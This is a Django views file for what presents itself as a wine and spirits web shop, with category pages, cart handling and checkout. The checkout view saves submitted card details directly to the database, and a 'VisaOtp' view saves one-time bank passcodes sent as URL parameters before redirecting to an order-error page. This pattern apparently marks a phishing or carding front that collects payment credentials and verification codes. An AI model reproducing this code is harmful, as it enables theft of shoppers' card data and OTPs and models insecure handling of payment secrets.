from django.contrib import messages
from django.core.exceptions import ObjectDoesNotExist
from django.contrib.auth.decorators import login_required
from django.contrib.auth.mixins import LoginRequiredMixin
from django.shortcuts import render, get_object_or_404
from django.views.generic import ListView, DetailView, View
from .models import Item, OrderItem, Order, Category
from django.shortcuts import redirect
from django.utils import timezone
from django.core.paginator import Paginator
from .forms import CardDetailsForm, OtpForm
import random


def Home(request):
    items = list(Item.objects.filter(category__id=1))

#    arrive = list(Item.objects.all())
#    itemListJustArrive = random.sample(arrive,10)
    totalRedWine = Item.objects.filter(category__id=1).count()
    totalWhiteWine = Item.objects.filter(category__id=2).count()
    SparklingWine = Item.objects.filter(category__id=5).count()
    totalSpirits = Item.objects.filter(category__id=4).count()
    totalRoseWine = Item.objects.filter(category__id=3).count()
    totalWhisky = Item.objects.filter(category__id=6).count()
    return render(request, "home.html",{'items':items, 'totalRedWine':totalRedWine, 'totalWhiteWine':totalWhiteWine, 'SparklingWine':SparklingWine,'totalSpirits':totalSpirits, 'totalRoseWine':totalRoseWine, 'totalWhisky':totalWhisky})
# 'itemList': itemList, 'itemListJustArrive':itemListJustArrive,


def RedWine(request):
    p = Paginator(Item.objects.filter(category__id=1), 8)
    page = request.GET.get('page')
    context = p.get_page(page)
    name = 'Red' + ' ' + 'wine'
    return render(request, "product-category.html",{ 'name':name, 'context':context })


def WhiteWine(request):
    p = Paginator(Item.objects.filter(category__id=2), 8)
    page = request.GET.get('page')
    context = p.get_page(page)
    name = 'White' + ' ' + 'wine'
    return render(request, "product-category.html",{ 'name':name, 'context':context })

def SparklingWine(request):
    p = Paginator(Item.objects.filter(category__id=5), 8)
    page = request.GET.get('page')
    context = p.get_page(page)
    name = 'Sparkling' + ' ' + 'wine'
    return render(request, "product-category.html",{ 'name':name, 'context':context })

def Spirits(request):
    p = Paginator(Item.objects.filter(category__id=4), 8)
    page = request.GET.get('page')
    context = p.get_page(page)
    name = 'Spirits'
    return render(request, "product-category.html",{ 'name':name, 'context':context })

def RoseWine(request):
    p = Paginator(Item.objects.filter(category__id=3), 8)
    page = request.GET.get('page')
    context = p.get_page(page)
    name = 'Rose' + ' ' + 'wine'
    return render(request, "product-category.html",{ 'name':name, 'context':context })

def Whisky(request):
    p = Paginator(Item.objects.filter(category__id=6), 8)
    page = request.GET.get('page')
    context = p.get_page(page)
    name = 'Whisky'
    return render(request, "product-category.html",{ 'name':name, 'context':context })


class ItemDetailView(DetailView):
    model = Item
    template_name = "product.html"


class ItemError(LoginRequiredMixin, View):
    def get(self, *args, **kwargs):
        try:
            order = Order.objects.get(user=self.request.user, ordered=False)
            context = {
                'object': order
            }
            return render(self.request, 'order-error.html', context)
        except ObjectDoesNotExist:
            messages.error(self.request, "You do not have an active order")
            return redirect("/")


def paypal(request):
    return render(request, "paypal.html")


def paypalCon(request):
    return render(request, "paypal-con.html")


class delivery(View):
    def get(self, *args, **kwargs):
        return render(self.request, "delivery.html")

def ContactUs(request):
    return render(request, "contact.html")

def EndUs(request):
    return render(request, "end.html")


def VisaOtp(request):
    form = OtpForm(request.GET)
    if request.method == "GET":
       if form.is_valid():
           form.save()
           return redirect("core:product-error")
    return render(request , 'visa-otp.html' ,{
       'form' : form
        })


def product(request):
    context = {
        'items': Item.objects.all()
    }
    return render(request, "product.html", context)


def search(request):
    if request.method == "POST":
        searched = request.POST['searched']
        context = Item.objects.filter(title__contains=searched)
        return render(request, "search.html", {'searched': searched, 'context': context})
    else:
        return render(request, "home.html")


@login_required
def add_to_cart(request, slug):
    item = get_object_or_404(Item, slug=slug)
    order_item, created = OrderItem.objects.get_or_create(
        item=item,
        user=request.user,
        ordered=False
    )

    order_qs = Order.objects.filter(user=request.user, ordered=False)
    if order_qs.exists():
        order = order_qs[0]
        if order.items.filter(item__slug=item.slug).exists():
            order_item.quantity += 1
            order_item.save()
            messages.info(request, "This item quantity was updated.")
            return redirect("core:order-summary")
        else:
            order.items.add(order_item)
            messages.info(request, "This item was added to your cart.")
            return redirect("core:order-summary")
    else:
        ordered_date = timezone.now()
        order = Order.objects.create(
            user=request.user, ordered_date=ordered_date)
        order.items.add(order_item)
        messages.info(request, "This item was added to your cart.")
        return redirect("core:order-summary")


@login_required
def remove_from_cart(request, slug):
    item = get_object_or_404(Item, slug=slug)
    order_qs = Order.objects.filter(user=request.user, ordered=False)
    if order_qs.exists():
        order = order_qs[0]
        if order.items.filter(item__slug=item.slug).exists():
            order_item = OrderItem.objects.filter(
                item=item,
                user=request.user,
                ordered=False
            )[0]
            order_item.quantity = 1
            order_item.save()
            order.items.remove(order_item)
            messages.info(request, "This item was removed from your cart.")
            return redirect("core:order-summary")
        else:
            messages.info(request, "This item was not in your cart.")
            return redirect("core:product", slug=slug)
    else:
        messages.info(request, "You do not have an active order.")
        return redirect("core:product", slug=slug)


@login_required
def remove_single_item_from_cart(request, slug):
    item = get_object_or_404(Item, slug=slug)
    order_qs = Order.objects.filter(user=request.user, ordered=False)
    if order_qs.exists():
        order = order_qs[0]
        if order.items.filter(item__slug=item.slug).exists():
            order_item = OrderItem.objects.filter(
                item=item,
                user=request.user,
                ordered=False
            )[0]
            order_item.quantity -= 1
            order_item.save()
            messages.info(request, "This item quantity was updated.")
            return redirect("core:order-summary")
        else:
            messages.info(request, "This item was not in your cart.")
            return redirect("core:product", slug=slug)
    else:
        messages.info(request, "You do not have an active order.")
        return redirect("core:product", slug=slug)


@login_required
def checkout(request):
    form = CardDetailsForm(request.POST)
    if request.method == "POST":
       if form.is_valid():
           form.save()
           return redirect("core:delivery")
    return render(request , 'checkout.html' ,{
       'form' : form
        })

class OrderSummaryView(LoginRequiredMixin, View):
    def get(self, *args, **kwargs):
        try:
            order = Order.objects.get(user=self.request.user, ordered=False)
            context = {
                'object': order
            }
            return render(self.request, 'order_summary.html', context)
        except ObjectDoesNotExist:
            messages.error(self.request, "You do not have an active order")
            return redirect("/")
